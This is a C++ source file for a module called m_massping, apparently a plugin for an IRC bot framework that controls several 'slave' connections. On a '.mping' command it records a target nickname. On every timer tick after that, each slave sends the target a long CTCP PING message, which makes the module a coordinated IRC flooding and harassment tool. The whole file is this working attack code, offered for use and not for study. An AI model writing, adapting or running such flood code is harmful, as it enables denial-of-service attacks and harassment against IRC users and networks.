#include <iostream>
#include <unistd.h>
#include <fnmatch.h>
#include "irc.h"
#include "../str.h"
using namespace std;

extern "C" {

string ping_target;

void m_massping_cmd(net::TomiTCP &f, string snick, vector<string> cl)
{
    if (cl[0] == ".mping") {
	if (cl.size() != 2) {
	    S(f,"PRIVMSG %s :Need 1 parameters\n",snick.c_str());
	} else {
	    ping_target = strtolower(cl[1]);
	    S(f,"PRIVMSG %s :ping_target = %s\n",snick.c_str(),ping_target.c_str());
	}
	return;
    }
}

void m_massping_timer(net::TomiTCP &f)
{
    if (!ping_target.length())
	return;

    for (slaves_t::iterator i = slaves.begin(); i != slaves.end(); i++) {
	fprintf(*(i->s),"PRIVMSG %s :PING 123456789 123456789 123456789 123456789 123456789 123456789 123456789 123456789 123456789 123456789 123456789 123456789 123456789 123456789 123456789 123456789 123456789 123456789 123456789 123456789 123456789 123456789 123456789 123456789\n",ping_target.c_str());
    }
}

void m_massping_init(struct module &m)
{
    cout << "m_massping init - hello" << endl;
    m.cmd = m_massping_cmd;
    m.timer = m_massping_timer;
}

}
